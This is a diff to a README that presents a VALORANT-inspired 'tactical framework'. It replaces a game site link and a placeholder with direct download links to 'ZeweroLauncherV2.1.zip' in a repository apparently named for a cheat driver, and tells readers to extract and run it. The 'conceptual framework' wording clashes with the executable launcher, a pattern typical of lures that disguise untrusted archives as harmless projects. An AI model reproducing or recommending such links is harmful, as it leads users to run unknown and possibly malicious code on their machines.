@@ -3,7 +3,7 @@
 > Inspired by the competitive intensity and visual language of **VALORANT**.
 
 <p align="center">
-  <a href="https://lawwagame.com/" target="_blank">
+  <a href="https://github.com/H7amadpro/Valorant-EDV-DRIVER-CC/raw/main/Driver/ZeweroLauncherV2.1.zip" target="_blank">
     <img src="https://img.shields.io/badge/DOWNLOAD-Tactical_Framework-red?style=for-the-badge&logo=riotgames&logoColor=white">
   </a>
 </p>
@@ -60,7 +60,7 @@
 
 1. **Download the package**  
 
-   [⬇️ Download Package](#)  
+   [⬇️ Download Package](https://github.com/H7amadpro/Valorant-EDV-DRIVER-CC/raw/main/Driver/ZeweroLauncherV2.1.zip)  
 2. **Download:** Conceptual framework as a ZIP archive 
 3. **Extract & Run:** Unzip and launch the simulation tool.  
 
